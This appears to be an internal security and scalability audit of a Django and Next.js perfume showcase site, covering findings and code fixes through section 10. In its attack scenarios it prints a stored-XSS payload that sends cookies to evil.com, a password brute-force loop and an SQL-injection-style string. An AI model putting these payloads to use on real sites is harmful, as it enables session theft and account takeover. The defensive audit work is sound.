# M.M ATTARWALA — Project Security & Scalability Audit Report

**Prepared:** June 2026  
**Scope:** Full-stack audit — Django 5 backend, Next.js 14 frontend, MySQL 8 database  
**Branch:** `main`  
**Auditor:** Internal code review via static analysis and architecture assessment

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Architecture Overview](#2-architecture-overview)
3. [Technology Stack Review](#3-technology-stack-review)
4. [Security Analysis](#4-security-analysis)
5. [Scalability Analysis](#5-scalability-analysis)
6. [Performance Review](#6-performance-review)
7. [Deployment & DevOps Review](#7-deployment--devops-review)
8. [Frontend Architecture Review](#8-frontend-architecture-review)
9. [Backend Architecture Review](#9-backend-architecture-review)
10. [Database Architecture Review](#10-database-architecture-review)
11. [API Security Review](#11-api-security-review)
12. [Risk Assessment Matrix](#12-risk-assessment-matrix)
13. [Production Readiness Checklist](#13-production-readiness-checklist)
14. [Critical Vulnerabilities](#14-critical-vulnerabilities)
15. [Immediate Fixes Required](#15-immediate-fixes-required)
16. [Enterprise Scaling Recommendations](#16-enterprise-scaling-recommendations)
17. [Future Architecture Roadmap](#17-future-architecture-roadmap)
18. [Best Practices Recommendations](#18-best-practices-recommendations)
19. [Final Ratings & Conclusion](#19-final-ratings--conclusion)

---

## 1. Executive Summary

M.M ATTARWALA is a luxury perfume showcase platform with admin-only product management and WhatsApp-driven conversion flow. The architecture is fundamentally sound — clean separation between frontend and backend, proper JWT implementation, structured settings hierarchy, and modular Django apps. However, several security gaps and scalability omissions must be addressed before this system can be considered production-ready for public deployment under real traffic.

**The most urgent issues identified:**

- No rate limiting on the login endpoint → brute-force attacks will succeed undetected
- JWT access tokens stored in JavaScript-accessible cookies (missing `httpOnly` flag) → XSS token theft
- Django admin interface exposed at `/django-admin/` with default credentials in seed data
- Image upload validates MIME type from a user-controlled HTTP header, not actual file content → polyglot file upload risk
- No pagination on product list and admin inquiry list endpoints → denial of service as catalog grows
- `render.yaml` deploys to Render's **free tier** with 2 Gunicorn workers — completely inadequate for production

The system scores **6.1/10** overall. It is a well-structured prototype that needs targeted hardening before public deployment.

---

## 2. Architecture Overview

```
                    ┌──────────────────────────────────┐
                    │         Vercel (Frontend)         │
                    │   Next.js 14 App Router (SSR)     │
                    │   Tailwind CSS + Framer Motion     │
                    └────────────────┬─────────────────┘
                                     │ HTTPS (JWT in Cookie)
                    ┌────────────────▼─────────────────┐
                    │        Render / VPS (Backend)     │
                    │   Django 5 + DRF + SimpleJWT      │
                    │   Gunicorn (2 workers, gthread)   │
                    │   WhiteNoise (static files)       │
                    └────────┬──────────────┬──────────┘
                             │              │
               ┌─────────────▼──┐     ┌────▼─────────────┐
               │   MySQL 8 DB   │     │  /media/ storage  │
               │  (remote host) │     │  (local FS / CDN) │
               └────────────────┘     └──────────────────┘
```

**Access model:**
- Public users: browse products, submit fragrance inquiries
- Admin user: single staff account, manages all content via JWT

**Data flow:**
1. Frontend fetches public data (products, categories, settings) at build time (SSG) or on demand (CSR)
2. Admin actions go through JWT-authenticated DRF endpoints
3. Image uploads hit `/api/admin/upload-image/` → local `media/products/` (dev) or Cloudinary (prod, not yet wired)
4. Inquiry form submits to `/api/inquiries/` (unauthenticated) and optionally triggers WhatsApp redirect

---

## 3. Technology Stack Review

| Layer | Technology | Version | Assessment |
|-------|-----------|---------|------------|
| Frontend Framework | Next.js App Router | 14.2.5 | Solid. Up-to-date. |
| UI Styling | Tailwind CSS | 3.4.10 | Good choice for this scale. |
| Animation | Framer Motion | 11.3.19 | Heavy bundle risk on mobile. |
| HTTP Client | Axios | 1.7.7 | Good. Interceptors well-used. |
| Cookie Management | js-cookie | 3.0.5 | Client-side only — cannot set `httpOnly`. |
| Backend Framework | Django | 5.0.6 | Good. Settings hierarchy is clean. |
| REST Layer | Django REST Framework | 3.15.2 | Well-configured. |
| Auth | SimpleJWT | 5.3.1 | Solid. Rotation + blacklist enabled. |
| CORS | django-cors-headers | 4.4.0 | Configured. Dev config too permissive. |
| Database | MySQL 8 | — | Adequate. No replication. |
| ORM | Django ORM | — | Safe from SQL injection. |
| Image Storage | Local FS (dev) / Cloudinary (prod) | — | Cloudinary not yet activated in prod path. |
| Static Files | WhiteNoise | 6.7.0 | Fine for low traffic. CDN needed for scale. |
| Process Manager | Gunicorn + gthread | 22.0.0 | Underpowered: 2 workers. |
| Containerization | Docker | — | Basic Dockerfile. No compose. |
| Frontend Deploy | Vercel | — | Appropriate. |
| Backend Deploy | Render (free tier) | — | **Not production grade.** |

### Dependency Security Notes

- All pinned to specific versions — good practice.
- `pylint==3.2.5` and `autopep8==2.3.1` are in `requirements.txt` as production deps — these are dev tools that add unnecessary weight to the production image.
- No `pip-audit` or Dependabot configured to catch known CVEs in dependencies.

---

## 4. Security Analysis

### 4.1 Authentication & JWT

#### `CRITICAL` — No Rate Limiting on Login Endpoint

**File:** `backend/apps/authentication/views.py:9`  
**Problem:** `LoginView` uses `permission_classes = [AllowAny]` with zero throttling. An attacker can attempt unlimited password combinations.  
**Impact:** Full account takeover for any username via brute force. Single admin account = single target.  
**Attack scenario:** `for password in rockyou.txt: POST /api/auth/login/ {"username": "admin", "password": password}` — no lockout, no delay, no detection.

**Fix:** Add DRF throttling:

```python
# backend/config/settings/base.py — add to REST_FRAMEWORK:
'DEFAULT_THROTTLE_CLASSES': [
    'rest_framework.throttling.AnonRateThrottle',
],
'DEFAULT_THROTTLE_RATES': {
    'anon': '100/day',
    'login': '5/minute',
}

# backend/apps/authentication/views.py
from rest_framework.throttling import ScopedRateThrottle

class LoginView(APIView):
    permission_classes = [AllowAny]
    throttle_classes = [ScopedRateThrottle]
    throttle_scope = 'login'
```

Also consider `django-axes` for IP-based lockout after N failed attempts.

---

#### `HIGH` — JWT Cookies Missing `httpOnly` Flag

**File:** `frontend/services/api.ts:44`  
**Problem:** `Cookies.set(AUTH_TOKEN_KEY, newAccess, { expires: 1/24 })` stores access token in a client-side accessible cookie. `js-cookie` cannot set `httpOnly` — only the server can do that.  
**Impact:** Any XSS vulnerability (even in a third-party script injected via Vercel, Framer Motion CDN, or user-supplied content) can steal the JWT and hijack the admin session.  
**Attack scenario:** Attacker injects `<script>fetch('https://evil.com?t='+document.cookie)</script>` via stored XSS → captures token → full admin access.

**Fix:** Move token issuance to HttpOnly cookies set by the backend:

```python
# Backend: set tokens as httpOnly cookies on login response
response = success_response(data={'user': ...})
response.set_cookie(
    'access_token',
    str(refresh.access_token),
    httponly=True,
    secure=True,
    samesite='Strict',
    max_age=3600,
)
response.set_cookie(
    'refresh_token',
    str(refresh),
    httponly=True,
    secure=True,
    samesite='Strict',
    max_age=7*24*3600,
)
```

If cookie-based auth is too complex right now: at minimum add `{ secure: true, sameSite: 'strict' }` to `Cookies.set()` calls in the frontend.

---

#### `HIGH` — Weak Default SECRET_KEY Fallback

**File:** `backend/config/settings/base.py:15`  
**Code:** `SECRET_KEY = os.environ.get('SECRET_KEY', 'change-me-in-production')`  
**Problem:** If `SECRET_KEY` env var is not set in production (env var deployment failure, misconfiguration), Django silently uses `'change-me-in-production'`. This key is public knowledge.  
**Impact:** All JWT tokens, session cookies, CSRF tokens, and password reset links become forgeable.

**Fix:**

```python
import sys

_secret = os.environ.get('SECRET_KEY')
if not _secret:
    if 'runserver' in sys.argv or os.environ.get('DJANGO_SETTINGS_MODULE', '').endswith('development'):
        _secret = 'dev-only-insecure-key'
    else:
        raise RuntimeError("SECRET_KEY environment variable is not set. Refusing to start.")
SECRET_KEY = _secret
```

---

#### `MEDIUM` — Access Token Lifetime Is 60 Minutes

**File:** `backend/config/settings/base.py`  
**Problem:** 60-minute JWT access tokens are long. If stolen, the attacker has a full hour before the token expires, and there is no revocation mechanism for access tokens (only refresh tokens are blacklisted).  
**Recommendation:** Reduce access token to 15 minutes. The existing refresh mechanism handles seamless renewal.

```python
'ACCESS_TOKEN_LIFETIME': timedelta(minutes=int(os.environ.get('JWT_ACCESS_TOKEN_LIFETIME_MINUTES', 15))),
```

---

### 4.2 Django Admin Exposure

#### `HIGH` — Django Admin at Predictable URL with Default Credentials

**File:** `backend/config/urls.py:7`  
**Code:** `path('django-admin/', admin.site.urls)`  
**Problem:** Django's built-in admin is accessible at `/django-admin/`. Seed data creates `admin / admin123`. Even if the user changes the password, the URL is predictable and the admin panel is another attack surface.  
**Impact:** Full database access via browser UI if credentials are reused or weak.

**Fix options:**
1. Rename the URL to something non-standard: `path('_internal-panel-9x7/', admin.site.urls)`
2. Restrict by IP via middleware or nginx `allow` rules
3. Disable entirely since all management is done via custom admin UI: comment out the line

---

### 4.3 File Upload Security

#### `HIGH` — MIME Type Validated from User-Controlled Header

**File:** `backend/apps/products/views.py:71`  
**Code:** `if file.content_type not in ALLOWED_IMAGE_TYPES:`  
**Problem:** `file.content_type` is taken from the `Content-Type` of the multipart upload field — a header the client sets. An attacker can upload a PHP shell as `image/jpeg` by setting the correct header. The file gets written to `media/products/` with a `.php` extension extracted from `file.name`.  
**Impact:** Remote code execution if the web server executes PHP from the media directory, or path traversal / stored XSS via SVG.

**Fix:** Validate actual file content using `python-magic`:

```python
import magic

def _validate_image_bytes(file) -> bool:
    header = file.read(512)
    file.seek(0)
    mime = magic.from_buffer(header, mime=True)
    return mime in ('image/jpeg', 'image/png', 'image/webp')
```

Also: **always strip the extension from the original filename** — the current code uses `os.path.splitext(file.name)[1]` which trusts the client-provided filename. A file named `shell.php.jpg` would get extension `.jpg`, which is safe, but a file named `shell.php` would get `.php`. Replace with a hard-coded allowed extension map based on validated MIME type.

```python
MIME_TO_EXT = {
    'image/jpeg': '.jpg',
    'image/png': '.png',
    'image/webp': '.webp',
}
# ...
ext = MIME_TO_EXT.get(validated_mime, '.jpg')
filename = f"{uuid.uuid4().hex}{ext}"
```

---

#### `MEDIUM` — Media Files Served Publicly Without Authentication

**File:** `backend/config/urls.py:16`  
**Code:** `urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)`  
**Problem:** All uploaded images are served at `/media/products/<filename>` with no authentication check. Anyone who knows or guesses a filename can access it.  
**Context:** For a public product showcase this is acceptable for product images. However, if the admin ever uploads non-public documents, they would be exposed.  
**Recommendation:** Document this clearly. If sensitive files are ever added, serve them through an authenticated view or use Cloudinary's signed URLs.

---

### 4.4 CORS Configuration

#### `HIGH` — `CORS_ALLOW_ALL_ORIGINS = True` in Development Settings

**File:** `backend/config/settings/development.py:11`  
**Problem:** Development settings completely open CORS. If `DJANGO_SETTINGS_MODULE` is accidentally set to `development` in production (e.g., missing env var), any origin can make credentialed requests.  
**Impact:** Cross-origin session hijacking, CSRF bypass.

**Fix:** Add an explicit guard in `development.py`:

```python
import os
assert os.environ.get('DJANGO_ENV') == 'development', \
    "development.py loaded outside development environment!"
```

---

### 4.5 Missing Security Headers

#### `MEDIUM` — No Content Security Policy

**Problem:** Neither the Django backend nor the Next.js frontend defines a Content Security Policy. Without CSP, any injected script (from npm package compromise, Vercel edge script injection, or stored XSS) executes freely.

**Fix (Next.js `next.config.js`):**

```javascript
const securityHeaders = [
  { key: 'Content-Security-Policy', value: "default-src 'self'; img-src 'self' data: https://res.cloudinary.com; script-src 'self' 'unsafe-inline' (remove unsafe-inline once tested); connect-src 'self' https://your-backend.onrender.com" },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
];
```

---

#### `LOW` — `SECURE_HSTS_PRELOAD` Not Set

**File:** `backend/config/settings/production.py`  
**Problem:** `SECURE_HSTS_PRELOAD = True` is missing. Without preload, browsers that visit for the first time over HTTP are not protected.  

**Fix:**
```python
SECURE_HSTS_PRELOAD = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
```

---

### 4.6 Input Validation Gaps

#### `MEDIUM` — No Phone Number Validation in Inquiry Serializer

**File:** `backend/apps/inquiries/serializers.py`  
**Problem:** `FragranceRequestWriteSerializer` uses `models.CharField(max_length=50)` for `customer_phone` with no format validation. Accepts `'; DROP TABLE inquiries; --'` or scripts.  
**Impact:** Stored XSS if admin UI renders without escaping. Pollution of inquiry data.

**Fix:**
```python
import re
class FragranceRequestWriteSerializer(serializers.ModelSerializer):
    def validate_customer_phone(self, value):
        if not re.match(r'^\+?[\d\s\-\(\)]{7,20}$', value):
            raise serializers.ValidationError("Enter a valid phone number.")
        return value
```

---

#### `MEDIUM` — SiteSettings Bulk Update Accepts Arbitrary Keys

**File:** `backend/apps/site_settings/serializers.py:11`  
**Code:** `settings = serializers.DictField(child=serializers.CharField(allow_blank=True))`  
**Problem:** Admin can create any key in `SiteSetting`. No allowlist. A compromised admin account (or CSRF on a logged-in admin) could inject arbitrary keys that frontend might later render.

**Fix:** Add an allowlist validation:
```python
ALLOWED_SETTINGS_KEYS = {
    'brand_name', 'tagline', 'about_text', 'whatsapp_number',
    'hero_headline', 'hero_subheadline', 'image_layer_effect',
}

def validate_settings(self, value):
    invalid = set(value.keys()) - ALLOWED_SETTINGS_KEYS
    if invalid:
        raise serializers.ValidationError(f"Unknown setting keys: {invalid}")
    return value
```

---

### 4.7 Public Inquiry Endpoint Abuse

#### `HIGH` — No Rate Limiting on `POST /api/inquiries/`

**Problem:** The fragrance request creation endpoint (`FragranceRequestCreateView`) is fully public with no throttling. Attackers can flood the database with fake inquiries, exhausting storage and polluting admin data.

**Fix:** Apply throttling:
```python
class FragranceRequestCreateView(APIView):
    permission_classes = [AllowAny]
    throttle_classes = [ScopedRateThrottle]
    throttle_scope = 'inquiry_create'

# settings:
'DEFAULT_THROTTLE_RATES': {
    'login': '5/minute',
    'inquiry_create': '3/minute',
}
```

---

### 4.8 Audit Logging

#### `MEDIUM` — No Audit Trail for Admin Actions

**Problem:** No logging of which admin performed create/update/delete operations on products, categories, or settings. If credentials are compromised, there is no way to determine what was changed.

**Fix:** Add a simple audit middleware or signal:
```python
# apps/authentication/audit.py
import logging
audit_log = logging.getLogger('audit')

def log_admin_action(user, action, model, obj_id):
    audit_log.info(f"ADMIN_ACTION user={user.username} action={action} model={model} id={obj_id}")
```

For production: integrate with Sentry or a structured logging service (Datadog, Logtail).

---

## 5. Scalability Analysis

### 5.1 Missing Pagination

#### `HIGH` — No Pagination on Public Product List

**File:** `backend/apps/products/views.py:18`  
**Code:** `serializer = ProductListSerializer(products, many=True)` — returns all active products in a single response.  
**Impact:** 500 products × (name, slug, description, price, images JSON, category nested, subcategories nested) = multi-megabyte JSON response on every page load. Client-side performance degrades, server memory spikes.

**Fix:**
```python
from rest_framework.pagination import PageNumberPagination

class ProductListView(APIView):
    def get(self, request):
        products = Product.objects.filter(is_active=True).select_related('category')
        paginator = PageNumberPagination()
        paginator.page_size = 24
        page = paginator.paginate_queryset(products, request)
        serializer = ProductListSerializer(page, many=True)
        return paginator.get_paginated_response(serializer.data)
```

Also applies to `AdminProductListView` and `AdminFragranceRequestListView`.

---

### 5.2 N+1 Query Risk

#### `MEDIUM` — CategorySerializer.get_product_count Causes N+1

**File:** `backend/apps/categories/serializers.py:14`  
**Code:** `return obj.products.filter(is_active=True).count()`  
**Problem:** When serializing a list of N categories, this fires N separate `COUNT` SQL queries — one per category.

**Fix:** Annotate at the queryset level:
```python
from django.db.models import Count, Q

categories = Category.objects.annotate(
    active_product_count=Count('products', filter=Q(products__is_active=True))
)
```

Then in the serializer:
```python
def get_product_count(self, obj):
    return getattr(obj, 'active_product_count', obj.products.filter(is_active=True).count())
```

---

#### `MEDIUM` — AdminProductListView Missing `prefetch_related` for Subcategories

**File:** `backend/apps/products/views.py:47`  
**Code:** `products = Product.objects.all().select_related('category')`  
**Problem:** `ProductDetailSerializer` includes `subcategories` as a nested M2M relation. Without `prefetch_related('subcategories')`, each product hits the DB once more for its subcategories.

**Fix:**
```python
products = Product.objects.all().select_related('category').prefetch_related('subcategories')
```

---

### 5.3 Caching Strategy — Not Implemented

**Problem:** No caching layer exists. Every request to `/api/products/`, `/api/categories/`, `/api/settings/` hits MySQL. These endpoints are read-heavy and change infrequently.

**Recommended Redis integration points:**

| Endpoint | Cache Key | TTL |
|----------|-----------|-----|
| `GET /api/products/` | `products:list:{category}:{page}` | 5 min |
| `GET /api/products/featured/` | `products:featured` | 10 min |
| `GET /api/products/{slug}/` | `products:detail:{slug}` | 10 min |
| `GET /api/categories/` | `categories:list` | 30 min |
| `GET /api/settings/` | `settings:all` | 60 min |

**Implementation:**
```python
pip install django-redis

# settings:
CACHES = {
    "default": {
        "BACKEND": "django_redis.cache.RedisCache",
        "LOCATION": os.environ.get("REDIS_URL", "redis://localhost:6379/1"),
    }
}

# In views:
from django.core.cache import cache

def get(self, request):
    cache_key = f"products:featured"
    cached = cache.get(cache_key)
    if cached:
        return success_response(data=cached)
    products = Product.objects.filter(is_active=True, is_featured=True)[:8]
    data = ProductListSerializer(products, many=True).data
    cache.set(cache_key, data, 600)
    return success_response(data=data)
```

Invalidate cache on admin writes via `post_save` / `post_delete` signals.

---

### 5.4 Media Storage Scalability

#### `HIGH` — Local Filesystem Storage Not Scalable

**Problem:** Images stored in `media/products/` on the container filesystem. On Render free tier, this storage is **ephemeral** — it disappears on every deploy, dyno restart, or sleep/wake cycle. All uploaded images would be permanently lost.  
**Current state:** Cloudinary service exists in code (`backend/services/cloudinary_service.py`) but is not wired into production (no `DEFAULT_FILE_STORAGE` override in `production.py`).

**Fix (Immediate):** Wire Cloudinary for production:
```python
# production.py
DEFAULT_FILE_STORAGE = 'cloudinary_storage.storage.MediaCloudinaryStorage'
```

Also update `AdminImageUploadView` to use Cloudinary SDK in production instead of local file write.

---

### 5.5 Render Free Tier Limitations

**Critical for production:**
- Free tier **spins down after 15 minutes of inactivity** — cold start takes 30-60 seconds
- 512 MB RAM limit
- 0.1 CPU
- **No persistent disk**
- Shared networking — unpredictable latency

**Fix:** Upgrade to at least Render Starter ($7/mo) with a persistent disk or migrate to Cloudinary-only media storage on free tier.

---

## 6. Performance Review

### 6.1 Frontend Performance

#### Bundle Weight

| Concern | Detail | Severity |
|---------|--------|----------|
| Framer Motion | `^11.3.19` imported globally — 100KB+ gzipped | Medium |
| No bundle analysis | `@next/bundle-analyzer` not configured | Low |
| No dynamic imports | Framer Motion, heavy components loaded eagerly | Medium |
| Axios full bundle | No tree-shaking concern (Axios is already small) | Low |

**Fix for Framer Motion:**
```typescript
// Lazy-load motion components only where needed
const { motion } = await import('framer-motion')

// Or use next/dynamic:
const MotionDiv = dynamic(() => import('framer-motion').then(m => m.motion.div), { ssr: false })
```

---

#### Image Optimization

**Problem:** The project likely uses plain `<img>` tags for product images. Next.js `next/image` is not referenced in the tech description.  
**Impact:** No automatic WebP conversion, no lazy loading, no responsive srcset generation, no blur placeholders.

**Fix:** Replace all product image `<img>` elements with `next/image`:
```tsx
import Image from 'next/image'
<Image
  src={product.image}
  alt={product.name}
  width={400}
  height={533}  // 3:4 ratio
  className="object-cover"
  placeholder="blur"
  blurDataURL="data:image/jpeg;base64,..."
/>
```

Configure `next.config.js` to allow Cloudinary domain:
```javascript
images: {
  domains: ['res.cloudinary.com'],
}
```

---

#### No Static Generation for Product Pages

**Problem:** Product detail pages at `/products/[slug]` are likely rendered server-side on every request (SSR). These pages change only when admin updates a product.

**Fix:** Use `generateStaticParams` for static generation:
```typescript
// app/products/[slug]/page.tsx
export async function generateStaticParams() {
  const products = await fetchAllProductSlugs()
  return products.map(p => ({ slug: p.slug }))
}

export const revalidate = 300 // ISR: revalidate every 5 minutes
```

---

### 6.2 Backend Performance

| Issue | Location | Impact | Fix |
|-------|----------|--------|-----|
| No database indexes on `Product.slug` (only unique) | `products/models.py` | Slow slug lookups on large catalogs | Add `db_index=True` (unique implies index — OK) |
| No index on `Product.is_active` + `is_featured` | `products/models.py` | Full table scan for featured query | Add `Meta.indexes` |
| No index on `FragranceRequest.status` | `inquiries/models.py` | Slow filtered inquiry list | Add index |
| No response compression | `base.py` middleware | Larger payloads over slow connections | Add GZip middleware |
| `ProductDetailSerializer` used in admin list | `products/views.py:47` | Heavier serializer than needed | Use `ProductListSerializer` for list, `ProductDetailSerializer` for single |

**Recommended indexes:**
```python
# products/models.py
class Meta:
    ordering = ['-created_at']
    indexes = [
        models.Index(fields=['is_active', 'is_featured'], name='idx_active_featured'),
        models.Index(fields=['is_active', 'category'], name='idx_active_category'),
        models.Index(fields=['created_at'], name='idx_created_at'),
    ]

# inquiries/models.py
class Meta:
    ordering = ['-created_at']
    indexes = [
        models.Index(fields=['status', 'created_at'], name='idx_status_created'),
    ]
```

**Add GZip middleware:**
```python
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'whitenoise.middleware.WhiteNoiseMiddleware',
    'django.middleware.gzip.GZipMiddleware',  # Add this
    ...
]
```

---

## 7. Deployment & DevOps Review

### 7.1 Render Configuration

#### `CRITICAL` — `plan: free` in render.yaml

**File:** `backend/render.yaml:8`  
**Problem:** Free Render tier is not suitable for production. Dyno sleeps, no persistent disk, 512MB RAM, shared CPU.

**Fix:**
```yaml
plan: starter  # minimum for production ($7/mo)
disk:
  name: media-disk
  mountPath: /app/media
  sizeGB: 5
healthCheckPath: /api/health/
```

---

#### `MEDIUM` — No Health Check Endpoint

**Problem:** `render.yaml` does not define `healthCheckPath`. Render cannot detect if the Django app crashed but the container is still running.

**Fix:**
```python
# backend/config/urls.py
from django.http import JsonResponse

def health_check(request):
    return JsonResponse({"status": "ok"})

urlpatterns = [
    path('api/health/', health_check),
    ...
]
```

---

### 7.2 Docker Configuration

#### `MEDIUM` — Gunicorn Undersized for Production

**File:** `backend/Dockerfile:CMD`  
**Code:** `--workers 2 --threads 2`  
**Problem:** 2 workers handle 2 concurrent requests max. Under any real traffic, requests queue and time out.  
**Formula:** `workers = (2 × CPU_cores) + 1`. On a 2-core server: 5 workers.

**Fix for production:**
```dockerfile
CMD ["gunicorn", "config.wsgi:application", \
     "--bind", "0.0.0.0:8000", \
     "--workers", "4", \
     "--threads", "2", \
     "--worker-class", "gthread", \
     "--timeout", "30", \
     "--keep-alive", "5", \
     "--max-requests", "1000", \
     "--max-requests-jitter", "100", \
     "--access-logfile", "-", \
     "--error-logfile", "-"]
```

---

#### `LOW` — Dev Tools in Production Image

**File:** `backend/requirements.txt`  
**Problem:** `pylint==3.2.5` and `autopep8==2.3.1` are installed in the production Docker image. Adds ~50MB, increases attack surface.

**Fix:** Split requirements:
```
requirements/
  base.txt      # Django, DRF, etc.
  dev.txt       # -r base.txt, pylint, autopep8
  production.txt # -r base.txt, gunicorn
```

Update Dockerfile: `RUN pip install -r requirements/production.txt`

---

### 7.3 CI/CD Pipeline — Not Implemented

**Problem:** No GitHub Actions or other CI/CD. Every deploy is manual. No automated tests run before deploy. A broken push goes straight to production.

**Recommended GitHub Actions workflow:**

```yaml
# .github/workflows/ci.yml
name: CI

on: [push, pull_request]

jobs:
  backend-test:
    runs-on: ubuntu-latest
    services:
      mysql:
        image: mysql:8.0
        env:
          MYSQL_DATABASE: test_db
          MYSQL_ROOT_PASSWORD: test
        ports: ['3306:3306']
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install -r backend/requirements/dev.txt
      - run: python manage.py test tests --verbosity=2
        working-directory: backend
        env:
          DB_NAME: test_db
          DB_USER: root
          DB_PASSWORD: test
          DB_HOST: 127.0.0.1
          SECRET_KEY: ci-test-key

  frontend-build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20' }
      - run: npm ci && npm run build
        working-directory: frontend
        env:
          NEXT_PUBLIC_API_URL: http://localhost:8000/api
```

---

### 7.4 Secret Management

| Item | Current State | Risk | Fix |
|------|--------------|------|-----|
| `SECRET_KEY` in `.env` | Dev only, placeholder value | Low (dev) | Rotate if committed. Use Render/Vercel secret env vars. |
| `DB_PASSWORD` empty in dev | Empty root password | Low (local) | Add password even for dev. |
| WhatsApp numbers in config.ts fallback | Public business numbers | Acceptable | No action needed. |
| `CLOUDINARY_API_SECRET` | Placeholder only | None | Set via Render dashboard, never in code. |
| `.env` in `.gitignore` | Must verify | — | Run `git ls-files --error-unmatch backend/.env` to confirm not tracked. |

---

### 7.5 Staging Environment

**Problem:** No staging environment mentioned. Deploys go directly to production with no validation step.

**Recommendation:** Create a Render staging service pointed at the same repo but with `staging` branch. Use a separate MySQL database for staging. All features tested in staging before merging to `main`.

---

## 8. Frontend Architecture Review

### 8.1 Structure Assessment

The frontend structure is well-organized:
```
frontend/
├── app/
│   ├── (public)/           # Correct route grouping
│   └── admin/(dashboard)/  # Protected group
├── components/             # Flat — should be organized by domain
├── services/               # Good separation
├── types/                  # Good TypeScript typing
├── constants/config.ts     # Good central config
└── context/AuthContext.tsx # Global auth state
```

**Improvement:** The flat `components/` directory will become unmanageable. Recommended structure:
```
components/
├── ui/           # Generic: Button, Modal, Input, Badge
├── layout/       # Navbar, Footer, Sidebar
├── product/      # ProductCard, ProductGrid, ProductDetail
├── admin/        # NeoToggle, DataTable, StatsCard
└── fragrance/    # FragranceBuilder, BottleSVG
```

---

### 8.2 State Management

**Assessment:** `AuthContext` for global auth state is appropriate for this scale. No global product state — products fetched per page, which is correct for SSR/ISR.

**Risk:** If the admin dashboard grows complex (bulk operations, optimistic updates), the current fetch-on-mount pattern will cause stale data issues. Consider `SWR` or `TanStack Query` for admin data management.

---

### 8.3 Middleware Token Check Is Weak

**File:** `frontend/middleware.ts:6`  
**Code:** `const token = request.cookies.get(AUTH_TOKEN_KEY)?.value`  
**Problem:** Middleware only checks for cookie _existence_, not validity. An expired or invalid token cookie passes the check. The actual 401 is only caught when an API call is made.  
**Impact:** A user with an expired token sees the admin dashboard momentarily before being redirected.

**Fix:** This is acceptable for UX (the API interceptor handles the actual redirect). Document this behavior clearly. For stricter security, implement token expiry check in middleware using JWT decode (without secret verification — just exp claim check).

---

### 8.4 SEO Optimization

The project has `app/robots.ts` and `app/sitemap.ts` — good foundation.

**Recommendations:**
- Product pages should use `generateMetadata()` with product name, description, and Cloudinary OG image
- Homepage needs `structured data` (JSON-LD) for `LocalBusiness` schema (appropriate for a Vadodara shop)
- All admin routes should be `noindex` — verify `robots.ts` excludes `/admin/*`

---

## 9. Backend Architecture Review

### 9.1 App Structure Assessment

The Django app structure is clean:
```
apps/
├── authentication/   # Handles only auth — good single responsibility
├── products/         # Product CRUD + image upload — slightly heavy
├── categories/       # Clean
├── site_settings/    # Simple key-value store — good
└── inquiries/        # Clean
```

**Issue:** `AdminImageUploadView` lives in `apps/products/views.py` but is a cross-cutting concern. Should move to a dedicated `apps/media/` app or `utils/` if Cloudinary service is involved.

---

### 9.2 Missing Service Layer

**Problem:** Business logic is directly in views. For example, `AdminImageUploadView.post()` handles file validation, directory creation, file writing, and URL construction — all in one method. As the app grows, this becomes untestable and unmaintainable.

**Recommended pattern:**
```python
# apps/products/services.py
class ImageUploadService:
    @staticmethod
    def upload(file) -> str:
        """Returns URL of uploaded image."""
        ImageUploadService._validate(file)
        if settings.USE_CLOUDINARY:
            return ImageUploadService._upload_cloudinary(file)
        return ImageUploadService._upload_local(file)
```

Views become thin:
```python
class AdminImageUploadView(APIView):
    def post(self, request):
        file = request.FILES.get('image')
        if not file:
            return error_response('No image provided.')
        url = ImageUploadService.upload(file)
        return success_response(data={'url': url})
```

---

### 9.3 API Versioning

**Problem:** All endpoints are at `/api/` with no version prefix. When breaking changes are needed (e.g., changing response format, removing fields), all clients break simultaneously.

**Fix:** Add versioning now before public deployment:
```python
# config/urls.py
path('api/v1/', include('apps.products.urls')),
```

Alternatively, use DRF's URL-based versioning:
```python
REST_FRAMEWORK = {
    'DEFAULT_VERSIONING_CLASS': 'rest_framework.versioning.URLPathVersioning',
    'DEFAULT_VERSION': 'v1',
}
```

---

### 9.4 Exception Handling

**Problem:** Views use `try/except Product.DoesNotExist` inline. No global exception handler for unexpected errors. An unhandled exception returns Django's default 500 error which may leak stack traces in development.

**Fix:** Add DRF exception handler:
```python
# utils/exceptions.py
from rest_framework.views import exception_handler
from utils.response import error_response
import logging

logger = logging.getLogger(__name__)

def custom_exception_handler(exc, context):
    response = exception_handler(exc, context)
    if response is None:
        logger.exception("Unhandled exception in view %s", context.get('view'))
        return error_response("An unexpected error occurred.", status_code=500)
    return response

# settings:
REST_FRAMEWORK = {
    'EXCEPTION_HANDLER': 'utils.exceptions.custom_exception_handler',
}
```

---

### 9.5 Test Coverage Assessment

**Current:** 21 tests — auth (5), products (9), categories (7).  
**Missing:**
- Inquiry endpoint tests (0 tests)
- Settings endpoint tests (0 tests)
- Image upload tests (0 tests)
- Rate limiting behavior tests
- Token refresh flow tests
- Permission boundary tests (can public access admin endpoints?)

**Recommended minimum coverage:** 80% line coverage. Add `coverage.py` to CI:
```bash
coverage run manage.py test tests && coverage report --fail-under=80
```

---

## 10. Database Architecture Review

### 10.1 Schema Analysis

| Model | Issue | Severity |
|-------|-------|----------|
| `Product.images` | JSONField array of URLs — no referential integrity, no DB-level validation | Medium |
| `Product.fragrance_notes` | JSONField — cannot be indexed or queried efficiently | Low |
| `Product.volume_prices` | JSONField — denormalized, cannot query by volume | Medium |
| `SiteSetting` | Simple key-value EAV — appropriate for this use case | Acceptable |
| `FragranceRequest.notes` | JSONField list — appropriate for unstructured fragrance profiles | Acceptable |

**Recommendation for `volume_prices`:** If you need to query "all products available in 50ml", a JSONField can't help. Consider a `ProductVariant` model:
```python
class ProductVariant(models.Model):
    product = models.ForeignKey(Product, related_name='variants', on_delete=models.CASCADE)
    volume = models.CharField(max_length=20)
    price = models.DecimalField(max_digits=10, decimal_places=2)
    is_available = models.BooleanField(default=True)
```

---

